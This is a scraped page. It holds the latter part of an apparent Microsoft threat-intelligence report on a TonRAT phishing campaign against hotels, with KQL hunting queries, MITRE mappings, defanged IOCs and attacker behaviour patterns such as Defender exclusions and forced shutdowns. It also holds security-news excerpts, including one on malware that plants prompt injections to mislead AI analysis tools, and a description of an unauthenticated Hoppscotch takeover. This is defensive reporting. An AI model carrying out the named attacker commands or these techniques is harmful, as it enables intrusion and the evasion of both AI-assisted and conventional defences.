+Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+Customers with provisioned access can also use [Microsoft Security Copilot in Microsoft Defender](https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender) to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
+| Tactic | Observed activity | Microsoft Defender coverage |
+| Initial access | Photo-themed ZIP with fake image LNK | Microsoft Defender for Endpoint Trojan:Win32/Wacatac prevented |
+| Execution | Obfuscated PowerShell BigInt decoder downloads a .ps1 dropper | Microsoft Defender for Endpoint Suspicious PowerShell command line Microsoft Defender Antivirus TrojanDropper:PowerShell/TonRAT |
+| Node.js runs the decrypted malicious JavaScript implant | Microsoft Defender for Endpoint Suspicious Node.js child process execution Microsoft Defender Antivirus Trojan:JS/TonRAT | |
+| Persistence | Dual Run/RunOnce registry keys (Node.js + ProgramData EXE) | Microsoft Defender for Endpoint Anomaly detected in ASEP registry Node.js Hidden Run‑Key Persistence Microsoft Defender Antivirus Trojan:Win32/PureRat |
+Microsoft Security Copilot
+Microsoft Security Copilot customers can use the following [prebuilt promptbooks](https://learn.microsoft.com/copilot/security/using-promptbooks) to support investigation and response for activity related to this campaign:
+- Incident investigation: Summarize incidents and triage alerts related to Node.js persistence, PowerShell decode chains, and registry modification.
+- Microsoft User analysis: Profile compromised hospitality accounts (reception, frontdesk, reservations) for scope assessment.
+Advanced hunting queries
+Microsoft Defender XDR
+NOTE: The following sample queries lets you search for a week’s worth of events. To explore up to 30 days’ worth of raw data to inspect events in your network and locate potential related indicators for more than a week, go to the Advanced Hunting page > Query tab, select the calendar dropdown menu to update your query to hunt for the Last 30 days.
+Fake image shortcut execution (both LNK naming patterns)
+This query identifies execution of shortcut files matching the campaign’s photo-themed LNK naming convention across both Wave 1 and Wave 2 patterns.
+DeviceProcessEvents | where FileName =~ "explorer.exe" or FileName =~ "cmd.exe" or FileName =~ "powershell.exe" | where ProcessCommandLine has ".lnk" | where ProcessCommandLine has_any ("IMG-", "PHOTO-") and ProcessCommandLine has ".png.lnk" | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Node.js implant execution from user-space paths
+This query identifies Node.js execution from the campaign’s characteristic AppData\Local\Nodejs\ staging path with JavaScript payload arguments.
+DeviceProcessEvents | where FileName =~ "node.exe" | where FolderPath has @"\AppData\Local\Nodejs\" | where ProcessCommandLine has ".js" | project Timestamp, DeviceName, FolderPath, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+.NET DLL compilation from PowerShell-downloaded scripts (Wave 2)
+This query detects the Wave 2 attack chain expansion where PowerShell scripts trigger dynamic .NET compilation through csc.exe.
+DeviceProcessEvents | where FileName in~ ("csc.exe", "cvtres.exe") | where InitiatingProcessFileName in~ ("powershell.exe", "pwsh.exe") or InitiatingProcessFolderPath has @"\AppData\Local\Temp\" | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Defender process exclusions followed by Temp execution
+This query correlates Defender exclusion modifications with subsequent executable launches from temporary paths within a 30-minute window.
+let exclusionEvents = DeviceProcessEvents | where FileName in~ ("powershell.exe", "pwsh.exe") | where ProcessCommandLine has "Add-MpPreference" and ProcessCommandLine has "-ExclusionProcess" | project DeviceId, DeviceName, ExclusionTime=Timestamp, ExclusionCmd=ProcessCommandLine; let tempExecs = DeviceProcessEvents | where FolderPath has @"\AppData\Local\Temp\" | where FileName endswith ".exe" or ProcessCommandLine has ".exe" | project DeviceId, TempExecTime=Timestamp, TempFile=FileName, TempPath=FolderPath, TempCmd=ProcessCommandLine; exclusionEvents | join kind=inner tempExecs on DeviceId | where TempExecTime between (ExclusionTime .. ExclusionTime + 30m) | project DeviceName, ExclusionTime, ExclusionCmd, TempExecTime, TempFile, TempPath, TempCmd | order by ExclusionTime desc |
+Installer or unpacker behavior using is-.tmp and silent flags
+This query identifies the campaign’s characteristic use of temporary installer files with silent execution flags.
+DeviceProcessEvents | where ProcessCommandLine has @"\is-" and ProcessCommandLine has ".tmp" | where ProcessCommandLine has_any ("/SL5", "/VERYSILENT") | project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Registry persistence to Node.js and ProgramData
+This query detects creation or modification of Run or RunOnce values pointing to the campaign’s persistence locations.
+DeviceRegistryEvents | where RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\Run" or RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\RunOnce" | where RegistryValueData has_any (@"\AppData\Local\Nodejs\", @"\ProgramData\") | project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Non-standard port beaconing from Node.js or suspicious user-space binaries
+This query identifies network connections on the campaign’s observed C2 ports from suspicious process locations.
+DeviceNetworkEvents | where RemotePort in (8443, 8445, 8453, 5555, 56001, 56002, 56003) | where InitiatingProcessFileName =~ "node.exe" or InitiatingProcessFolderPath has @"\AppData\Local\Temp\" or InitiatingProcessFolderPath has @"\AppData\Local\Nodejs\" or InitiatingProcessFolderPath has @"\ProgramData\" | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl | order by Timestamp desc |
+Wave 2 .cfd and .bond domain connections
+This query detects network connections to the campaign’s Wave 2 domain infrastructure.
+DeviceNetworkEvents | where RemoteUrl has_any (".cfd", ".bond", ".click") | where RemoteUrl has "photo-" or RemoteUrl has_any ("zloapobikahy23", "higoksbupwou", "aluminiostramuntana") | project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Browser automation and forced shutdown on previously affected hosts
+This query identifies late-stage post-compromise behavior on hosts already showing earlier campaign indicators.
+let suspiciousHosts = DeviceProcessEvents | where FileName =~ "node.exe" and FolderPath has @"\AppData\Local\Nodejs\" | distinct DeviceId; DeviceProcessEvents | where DeviceId in (suspiciousHosts) | where ProcessCommandLine has_any ("--headless", "--no-sandbox", "shutdown -s -t 0") | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Calendly-associated notification infrastructure used in phishing delivery
+This query identifies emails from the campaign’s Calendly-associated subdomain with the characteristic display name.
+EmailEvents | where SenderMailFromDomain =~ "em1618.calendly.com" | where SenderMailFromAddress startswith "bounces+13766497-" or SenderDisplayName has "Booking Manager" | project Timestamp, NetworkMessageId, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation, ThreatTypes | order by Timestamp desc |
+share.google redirect token detection in email URLs
+This query detects emails containing share.google redirect URLs, which the campaign uses as an intermediate hop to obscure the final phishing destination.
+EmailUrlInfo | where Url contains "share.google/" | join kind=inner EmailEvents on NetworkMessageId | where SenderMailFromDomain has "calendly" or SenderDisplayName has "Booking" | project Timestamp, NetworkMessageId, SenderFromAddress, RecipientEmailAddress, Subject, Url, DeliveryAction | order by Timestamp desc |
+Calendly redirect URL phishing detection
+This query identifies emails containing Calendly redirect URLs that match known campaign patterns, including share.google tokens or photo-*.cfd domains.
+EmailUrlInfo | where Url contains "calendly.com/url?q=" | where Url has_any ("share.google", "photo-", ".cfd") | join kind=inner EmailEvents on NetworkMessageId | project Timestamp, NetworkMessageId, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, Url, DeliveryAction, AuthenticationDetails | order by Timestamp desc |
+High-frequency file hash hunting (combined Waves 1 and 2)
+This query hunts for all known campaign file hashes across endpoint telemetry.
+let hashes = dynamic([ "83e970feb3f10692c164f6889f7a026f135c2433e5bf8e662a6e63a3b81267b7", "06a2888c1f07119873ccb051221bd8717281494b33585f4242556e6e5e227969", "04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1", "1c693bcdaf1da636eb21c274b21cc2f6c52c62ddd514700783eee83fe13acb0a", "2e5fd01b7949a45937b853eabcf4b03195614cf84338dcaaa97240d1c5301ddc", "3f66634f103b80412d1d670b91befab2a74425d2ea76d904c4a7ffae2ae94b44", "63565f15a99769bbcd527a4d53e5cc259d80e1254463ef9c878c2074685558ae", "49cc0e0c3ec060fb354cacee244d4f297aaefb6db66e67a21262d6c4d2eae1bd", "6580de3b74fd635a1d7a887b8f6e5b0c9ac9e90d6e20466ad41489203119cca9", "f629311734b7c6e6579f8e1d0e1e3f3bf72c9ac6c301b631ba4df7f393c41b14", "98825c0c7764f45c891275b2f038ea559e84b340df30b41c2cc77b8d4215c6c8", "bd6805782df15e53581096b99bd6bbb81f4d4a5e2d2b30954df63175a4075be9", "89934cb1494cf0327f0ab82fe644c74caf687814379cad116bd7adaca74c1028", "1f8daffec5945a13a1e9231f4a76655d4c7ef4560d0c64ca3abfe48f38297cbd", "9f10e3b6e5745784f26d18c38ce01fba054b19749c17260978ac11472564aee2", "97448688b292bfec6d83b153588076fe59b111c35ac4e42a916238df16a71e2f", "c5baa0c16b0074a1e94b48aa0177e9bfc23746aca8a5b42848a6685da85658b5", "b7f46b192cd83a1d2487cb048cca645f6e8855b9673d500d50bbdb04eebc6bea" ]); DeviceFileEvents | where SHA256 in (hashes) | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc |
+Microsoft Sentinel
+Microsoft Sentinel customers can use the Microsoft Defender XDR connector to ingest the above queries or leverage the Threat Intelligence Mapping analytics rule to match campaign IOCs against ingested logs.
+MITRE ATT&CK techniques
+| Tactic | Technique ID | Technique Name | Observed Activity |
+| Resource Development | T1583.001 | Acquire Infrastructure: Domains | Short-lived .cfd landing domains (photo-26653[.]cfd, photo-26656[.]cfd, photo-27857[.]cfd) are registered and rotated every 2–3 days |
+| T1583.006 | Acquire Infrastructure: Web Services | Use of Calendly account (em1618.calendly[.]com) and generated share[.]google redirect tokens to relay phishing | |
+| T1584.006 | Compromise Infrastructure: Web Services | Suspected use of a compromised legitimate domain (ginrinsou[.]com) as an alternate sending relay | |
+| Initial Access | T1566.002 | Phishing: Spearphishing Link | Calendly notification emails carrying redirect links (observed from late May 2026) |
+| T1199 | Trusted Relationship | Authentication laundering through Calendly’s SendGrid infrastructure | |
+| Execution | T1204.002 | User Execution: Malicious File | User opens fake image LNK (IMG-/PHOTO-*.png.lnk) |
+| T1059.001 | PowerShell | Obfuscated bigint decoder downloads .ps1 | |
+| T1059.007 | JavaScript | Node.js implant executes .js payload with C2 domain | |
+| Defense Evasion | T1027 | Obfuscated Files or Information | Seven-phase PowerShell obfuscation evolution |
+| T1027.004 | Compile After Delivery | csc.exe compiles .NET DLL on-target (Wave 2) | |
+| T1036 | Masquerading | LNK files disguised as .png images | |
+| T1562.001 | Disable or Modify Tools | Add-MpPreference exclusions for Temp EXE files | |
+| Persistence | T1547.001 | Registry Run Keys / Startup Folder | Dual Run (Node.js) + RunOnce (ProgramData EXE) |
+| Discovery | T1016 | System Network Configuration Discovery | ip-api[.]com geolocation lookup |
+| Command & Control | T1571 | Non-Standard Port | C2 on ports 8443, 8445, 8453, 5555, 56001-56003 |
+Indicators of compromise
+Observed C2 IPs and non-standard ports
+| Indicator | Type | Description |
+| 178.16.54[.]27 | IP | Primary — Active in both waves, ports 56001/56002 |
+| 95.217.97[.]121 | IP | Persistent beacon (Wave 1) |
+| 193.202.84[.]32 | IP | Secondary (Wave 1) |
+| 178.16.55[.]179 | IP | Additional (Wave 1) |
+| 172.67.161[.]215 | IP | phishing TonRAT C2 (Cloudflare shared CDN ) |
+| 8443, 8445, 8453 | Port | Non-standard C2 ports |
+| 5555 | Port | Non-standard C2 port |
+| 56001, 56002, 56003 | Port | Non-standard C2 ports |
+Representative observed domains
+Wave 1 domains
+| Indicator | Type | Description |
+| prejointl[.]info | Domain | C2 domain |
+| safedocphoto[.]info | Domain | C2 domain |
+| recallnine[.]info | Domain | C2 domain |
+| kentjerk[.]info | Domain | C2 domain |
+| photodoc-secure[.]info | Domain | C2 domain |
+| kelopins[.]info | Domain | C2 domain |
+| docstore-safe[.]info | Domain | C2 domain |
+| photosafe-hub[.]info | Domain | C2 domain |
+| dashgamein[.]info | Domain | C2 domain |
+| image-vlt[.]info | Domain | C2 domain |
+| safedoc-storage[.]info | Domain | C2 domain |
+| safe-picvault[.]info | Domain | C2 domain |
+| photo-dekor[.]xyz | Domain | C2 domain |
+| reservebookphot[.]pro | Domain | C2 domain |
+| kellystreets[.]info | Domain | C2 domain |
+| widjssij728dj[.]com | Domain | C2 domain |
+| docshub-01[.]info | Domain | C2 domain |
+| photobookadm[.]pro | Domain | C2 domain |
+| safedoc-vault[.]info | Domain | C2 domain |
+| keypmenu[.]info | Domain | C2 domain |
+| photo-box[.]info | Domain | C2 domain |
+| expedla-getphoto[.]cloud | Domain | C2 domain |
+| vertualstreak[.]info | Domain | C2 domain |
+| montagelips[.]info | Domain | C2 domain |
+| racestrech[.]info | Domain | C2 domain |
+| derbyoni[.]info | Domain | C2 domain |
+| ministrew[.]info | Domain | C2 domain |
+| visaphoto-secure[.]info | Domain | C2 domain |
+| docshub-secure[.]com | Domain | C2 domain |
+| visaimage-storage[.]icu | Domain | C2 domain |
+| lookinlip[.]info | Domain | C2 domain |
+| safephoto-vault[.]info | Domain | C2 domain |
+| kiptownim[.]info | Domain | C2 domain |
+| finallyrain[.]info | Domain | C2 domain |
+| photobook-reserv[.]pro | Domain | C2 domain |
+| bookreservphoto[.]pro | Domain | C2 domain |
+| imagestore-hub[.]info | Domain | C2 domain |
+| visaimages[.]info | Domain | C2 domain |
+| visaphoto-vault[.]info | Domain | C2 domain |
+| visa-vault[.]info | Domain | C2 domain |
+| visa-safedocs[.]info | Domain | C2 domain |
+| joincroud[.]info | Domain | C2 domain |
+| kinghoruswe[.]info | Domain | C2 domain |
+| snapkeep[.]info | Domain | C2 domain |
+| deeprace[.]info | Domain | C2 domain |
+| lestresot[.]info | Domain | C2 domain |
+| recepyman[.]info | Domain | C2 domain |
+| recstrace[.]info | Domain | C2 domain |
+| heliosup[.]info | Domain | C2 domain |
+| fairyspells[.]info | Domain | C2 domain |
+| hakeiwjs727wj[.]com | Domain | C2 domain |
+| haobbao[.]com | Domain | C2 domain |
+| dancamp[.]info | Domain | C2 domain |
+| sec-safe-dc[.]info | Domain | C2 domain — Active in both waves |
+| secure-imagehub[.]info | Domain | C2 domain |
+| doc-imagehub[.]info | Domain | C2 domain |
+| imagevault-safe[.]info | Domain | C2 domain |
+| photo-hub-io[.]info | Domain | C2 domain |
+| safevault-hub[.]info | Domain | C2 domain |
+| tripadvisor-photo-view[.]com | Domain | C2 domain |
+| photo-7216302[.]sbs | Domain | C2 domain |
+Wave 2 domains
+| Indicator | Type | Description |
+| photo-26254[.]cfd | Domain | Phishing landing page |
+| photo-132454[.]cfd | Domain | Phishing landing page |
+| photo-8632454[.]cfd | Domain | Phishing landing page |
+| photo-21473[.]xyz | Domain | C2 domain |
+| photo-7216102[.]click | Domain | C2 domain |
+| zloapobikahy23[.]bond | Domain | C2 domain |
+| higoksbupwou[.]com | Domain | C2 domain |
+| aluminiostramuntana[.]com | Domain | C2 domain |
+| photo-26653[.]cfd | Domain | Phishing landing page |
+| photo-26654[.]cfd | Domain | Phishing landing page |
+| photo-26656[.]cfd | Domain | Phishing landing page |
+| photo-27857[.]cfd | Domain | Phishing landing page |
+Microsoft has assigned malicious ratings to these domains, and they are being blocked.
+File hashes
+| Indicator | Type | Description |
+| 83e970feb3f10692c164f6889f7a026f135c2433e5bf8e662a6e63a3b81267b7 | SHA-256 | Campaign payload (Wave 1) |
+| 06a2888c1f07119873ccb051221bd8717281494b33585f4242556e6e5e227969 | SHA-256 | Campaign payload (Wave 1) |
+| 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1 | SHA-256 | PE payload (xmnrwv9l.exe) — Same hash in both waves |
+| 1c693bcdaf1da636eb21c274b21cc2f6c52c62ddd514700783eee83fe13acb0a | SHA-256 | Campaign payload (Wave 1) |
+| 2e5fd01b7949a45937b853eabcf4b03195614cf84338dcaaa97240d1c5301ddc | SHA-256 | Campaign payload (Wave 1) |
+| 3f66634f103b80412d1d670b91befab2a74425d2ea76d904c4a7ffae2ae94b44 | SHA-256 | Campaign payload (Wave 1) |
+| 63565f15a99769bbcd527a4d53e5cc259d80e1254463ef9c878c2074685558ae | SHA-256 | Campaign payload (Wave 1) |
+| 49cc0e0c3ec060fb354cacee244d4f297aaefb6db66e67a21262d6c4d2eae1bd | SHA-256 | Campaign payload (Wave 1) |
+| 6580de3b74fd635a1d7a887b8f6e5b0c9ac9e90d6e20466ad41489203119cca9 | SHA-256 | Campaign payload (Wave 1) |
+| da4b72764ae929050353f3da759c839e2a061a8b9a8dd3c3b2e909d4a8a3291c | SHA-256 | Campaign payload (Wave 1) |
+| f629311734b7c6e6579f8e1d0e1e3f3bf72c9ac6c301b631ba4df7f393c41b14 | SHA-256 | Campaign payload (Wave 1) |
+| 98825c0c7764f45c891275b2f038ea559e84b340df30b41c2cc77b8d4215c6c8 | SHA-256 | Campaign payload (Wave 1) |
+| bd6805782df15e53581096b99bd6bbb81f4d4a5e2d2b30954df63175a4075be9 | SHA-256 | Campaign payload (Wave 1) |
+| 89934cb1494cf0327f0ab82fe644c74caf687814379cad116bd7adaca74c1028 | SHA-256 | Campaign payload (Wave 1) |
+| 1f8daffec5945a13a1e9231f4a76655d4c7ef4560d0c64ca3abfe48f38297cbd | SHA-256 | Campaign payload (Wave 1) |
+| 9f10e3b6e5745784f26d18c38ce01fba054b19749c17260978ac11472564aee2 | SHA-256 | IMG-386443483.png.lnk (Wave 2) |
+| 97448688b292bfec6d83b153588076fe59b111c35ac4e42a916238df16a71e2f | SHA-256 | PHOTO-215746435.png.lnk (Wave 2) |
+| c5baa0c16b0074a1e94b48aa0177e9bfc23746aca8a5b42848a6685da85658b5 | SHA-256 | qFWe908J.ps1 (419 KB, Wave 2) |
+| b7f46b192cd83a1d2487cb048cca645f6e8855b9673d500d50bbdb04eebc6bea | SHA-256 | bjygtujc.dll (3,072 bytes, compiled .NET, Wave 2) |
+| d14ba95cdce1ef7dc9ad3ac74949ca5db38b27378ee30f30a23cf26f9e875a11 | SHA-256 | node.exe (v24.13.0-win-x64, 89.9 MB) |
+Key behavioral patterns
+| Indicator | Type | Description |
+| Pattern A | Behavior | Obfuscated PowerShell downloader: BigInt decoder → iwr → .ps1 |
+| Pattern B | Behavior | .NET DLL compilation: csc.exe → cvtres.exe → <random>.dll (Wave 2) |
+| Pattern C | Behavior | Node.js implant: node.exe <random>.js <domain> |
+| Pattern D | Behavior | Defender exclusion: Add-MpPreference -ExclusionProcess |
+| Pattern E | Behavior | Temp EXE execution: Numerous random filenames |
+| Pattern F | Behavior | Installer or unpacker: *.tmp with /SL5 or /VERYSILENT |
+| Pattern G | Behavior | ProgramData copy: Lowercase, same hash |
+| Pattern H | Behavior | RunOnce loop persistence: Value refreshed after each execution |
+| Pattern I | Behavior | Browser automation: –headless –no-sandbox |
+| Pattern J | Behavior | Forced shutdown: cmd /c shutdown -s -t 0 |
+| Pattern K | Behavior | Persistence survival: Node.js Run key survives Defender PE block |
+| Pattern L | Behavior | Authentication laundering: Direct-path Calendly email passes SPF/DKIM/DMARC/CompAuth (share.google variant fails authentication) |
+| Pattern M | Behavior | Multi-hop redirect: Calendly → share.google → Google → photo-*.cfd |
+| Pattern N | Behavior | Domain rotation: photo-*.cfd domains with ~2–3 day lifespan |
+References
+[Technical Analysis of Suspicious Emails Targeting the Hotel Industry | SOC Prime](https://socprime.com/active-threats/technical-analysis-of-suspicious-emails-targeting-the-hotel-industry/)[ITOCHU Cyber & Intelligence](https://blog.itochuci.co.jp/entry/2026/06/11/110000)
+This research is provided by Microsoft Defender Security Research, Parth Jamodkar, and with contributions from members of Microsoft Threat Intelligence.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime)</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">New macOS malware embeds fake errors to confuse AI analysis tools</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/new-macos-malware-embeds-fake-errors-to-confuse-ai-analysis-tools/" target="_blank">Original Link</a></p>
+            <div class="content-text">A newly discovered macOS malware dubbed "Gaslight" is designed to confuse AI-assisted malware analysis tools by hiding prompt injection strings and fake debugging data within the executable. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">ThreatsDay Bulletin: Smart TV Proxyware, 24-Year curl Bug, AI Crime Forums + 13 More Stories</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html" target="_blank">Original Link</a></p>
+            <div class="content-text">It’s dumb out there again.
+This week has the usual smell of prod on fire and nobody wanting to admit who left the door open — old creds still working, trusted apps doing sketchy crap, browser tricks jumping the fence, and “normal” workflows turning into phishing pipes because apparently email was not enough hell already.
+The worst part is how cheap some of it feels. Not elite. Not cinematic. Just stale secrets, fake updates, lazy trust, and random boxes quietly becoming someone else’s infrastructure. Same internet, fresh headache. Let’s get into it.
+-
+[Privacy-first bot defense](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#privacy-first-bot-defense)Cloudflare has teamed up with Google Chrome, Microsoft Edge, and Mozilla Firefox to create a privacy-preserving protocol that websites can use to separate desirable web traffic from undesirable network requests. This involves the use of Private Access Control Tokens (PACT), which allow websites to issue anonymous tokens that assert a given browsing session is being run by a human. "A user's browser can then provide these tokens to other sites to prove that a human is in the loop, reducing the need for annoying and clunky captchas or invasive tracking," Cloudflare
+[said](https://cloudflare.net/news/news-details/2026/Cloudflare-Collaborates-With-Leading-Browsers-to-Develop-a-Privacy-First-Protocol-For-the-Global-Internet/default.aspx). "PACT is designed so that sites cannot leverage it to track or identify users or their browsing history." -
+[Six curl CVEs](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#six-curl-cves)AISLE said it
+[discovered](https://aisle.com/blog/aisle-discovers-6-new-cves-in-curl-including-the-oldest-issue-ever-reported)six vulnerabilities in curl, which range from "classic memory-lifetime issues to logic bugs in how libcurl decides whether a connection, credential, or host identity is still valid." One of the notable vulnerabilities is[CVE-2026-8932](https://curl.se/docs/CVE-2026-8932.html), which allows the library to "reuse a previously created connection even when some mTLS config-related option had been changed that should have prohibited reuse." AISLE described it as the oldest curl vulnerability reported so far, adding that it has been shipped in releases since curl[version 7.7](https://curl.se/ch/7.7.html), which was released on March 22, 2001. The identified flaws have been addressed in[version 8.21.0](https://curl.se/mail/lib-2026-06/0026.html). -
+[Unauthenticated takeover](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#unauthenticated-takeover)A critical security flaw has been disclosed in self-hosted versions of Hoppscotch(CVE-2026-50160, CVSS score: 10.0), an open source API platform, that can result in complete compromise. Offgrid Security's autonomous AI security agent, Kiro, has been
+[credited](https://www.offgridsec.com/blog-hoppscotch-cve-2026-50160.html)with discovering the bug. "The POST /v1/onboarding/config endpoint allows an unauthenticated attacker to inject arbitrary InfraConfig keys -- including JWT_SECRET and SESSION_SECRET -- into the database via mass assignment," the project maintainers[said](https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-j542-4rch-8hwf). "These keys are not declared in the SaveOnboardingConfigRequest DTO, but because the NestJS ValidationPipe does not strip extra properties, they pass through to the service layer, where Object.entries(dto) iterates all keys without restriction." A successful exploitation leads to full server compromise and persistent access that survives password resets. OffGrid Security told The Hacker News that four independent weaknesses are combined to allow an unauthenticated attacker to overwrite the JWT signing key in a single HTTP request, and the exploit requires no credentials. The issue has been fixed in hoppscotch-backend version 2026.5.0. -
+[Proxyware in smart TVs](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#proxyware-in-smart-tvs)A new report from Spur Intelligence has
+[revealed](https://spur.us/blog/smart-tv-apps-residential-proxy-sdks)that more than one-third of LG and Samsung smart TV apps it reviewed[contain proxyware](https://thehackernews.com/2026/06/weekly-recap-browser-bugs-edr-killers.html#:~:text=Israeli%20Company%20Linked%20to%20Popa%20Android%20TV%20Box%20Botnet)that can relay third-party traffic through the TV owner's internet connection with users' consent. The company said it scanned 6,038 apps across LG webOS and Samsung Tizen and found 2,058 that contain residential proxy software. This includes clocks, screensavers, games, fish tanks, and other low-utility apps. On LG webOS, 42.5% of apps carried such code. On Samsung Tizen, the rate was 26.9%. Across both platforms, it reached 34.1%. Bright Data, Massive, and Oxylabs take up the top three SDK providers for webOS and Tizen. "Smart TVs are almost ideal proxy hosts. They sit on the same home network as everything else, but they do not feel like computers, so people rarely audit them like computers," Spur said. "There is no battery drain to notice, no cellular bill to spike, no app switcher full of suspicious background activity. A TV can stay plugged in, signed in, and online for years while the user thinks of it as furniture." The threat intelligence firm said this dynamic also changes the consent equation, as users may not realize what it actually means to sell access to their residential IP address. "Technically, these applications are compliant with gaining consent based on how they inform the user," Spur CTO Alastair Parr told The Hacker News. "However, there is often no verification that the user is either of age or authorized to provide consent on the device. The reality is that there are likely many smart TVs scattered across office spaces and residential homes, quietly part of these networks, without the responsible owners' awareness or consent." Amazon's[Device and System Abuse Policy](https://developer.amazon.com/docs/policy-center/device-and-system-abuse.html)explicitly bars apps that facilitate proxy services for third parties. Similar protections have been[enabled](https://www.theverge.com/column/885244/smart-tv-web-crawler-ai)by Roku as well. However, LG and Samsung are yet to enforce an equivalent policy. -
+[Edgecution via Teams](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#edgecution-via-teams)An initial access broker (IAB) affiliated with Payouts King ransomware has been observed masquerading as IT personnel in social engineering attacks conducted via Microsoft Teams to deliver a malicious Microsoft Edge browser extension dubbed Edgecution. "The technique utilizes a malicious Microsoft Edge browser extension that exploits the Chrome native messaging protocol to interact with host-native applications beyond the confines of the browser sandbox," Zscaler ThreatLabz
+[said](https://www.zscaler.com/blogs/security-research/payouts-king-ransomware-initial-access-broker-deploys-new-edgecution). "By abusing this interface, the attackers gain direct host access, enabling them to manipulate the local filesystem, launch processes, and execute arbitrary code on the compromised host." The malware has two components: a Microsoft Edge browser extension named "Edge Monitoring Agent" that beacons to a command-and-control (C2) server and relays host-based commands to a Python-based backdoor, which can collect system information, enumerate running processes, provide filesystem access, and execute arbitrary Python code and shell commands. The extension will be invisible to a user as it's loaded in a headless Microsoft Edge browser. A similar attack chain involving a Chromium-based extension codenamed[SNOWBELT](https://thehackernews.com/2026/04/unc6692-impersonates-it-helpdesk-via.html)was detailed by Google-owned Mandiant in April 2026. -
+[Legacy credential breach](https://thehackernews.com/2026/06/threatsday-bulletin-smart-tv-proxyware.html#legacy-credential-breach)Competitive intelligence company Klue has revealed that a credential dating back to 2022, which was used as part of a limited pilot, was exploited by the
+[Icarus extortionists](https://thehackernews.com/2026/06/salesforce-disables-klue-app.html)to steal Salesforce data from its corporate customers, including several cybersecurity companies. In a statement shared with TechCrunch, the company[said](https://techcrunch.com/2026/06/23/klue-says-hackers-stole-credential-from-2022-that-led-to-customer-data-breaches/)the credential was "originally provided to a third-party in 2022, for a limited pilot." Klue did not share specifics about the purpose of the pilot, the duration for which it ran, or the identity of the third-party to whom the company gave the credentials. It's also unclear why the credential wasn't revoked immediately, assuming the pilot had concluded. Questions remain about how the attackers managed to acquire this legacy credential in the first place. A number of companies have come forward to confirm they have had limited Salesforce information stolen during the attack, including 8x8, BeyondTrust, Gong, Jamf, HackerOne, Insurity, LastPass, OneTrust, Pendo, Recorded Future, Snyk, Sprout Social, and Tanium. -
